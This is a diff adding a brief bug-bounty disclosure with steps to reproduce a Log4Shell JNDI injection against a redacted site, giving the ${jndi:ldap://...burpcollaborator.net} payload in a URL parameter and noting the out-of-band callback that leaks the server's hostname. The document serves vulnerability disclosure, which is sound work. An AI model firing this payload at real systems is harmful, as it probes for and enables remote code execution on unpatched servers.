@@ -1,0 +1,7 @@
+  Steps to Reproduce
+  Go to this url => https://█████/?x=${jndi:ldap://${hostName}.uri.xxxxx.burpcollaborator.net/a}
+  paste the poc code on parameter
+Then burp collaborator received reverse ping back Photos below
+POC CODE
+  ${jndi:ldap://${hostName}.uri.xxxxx.burpcollaborator.net/a}
+Reference: https://hackerone.com/reports/1624137
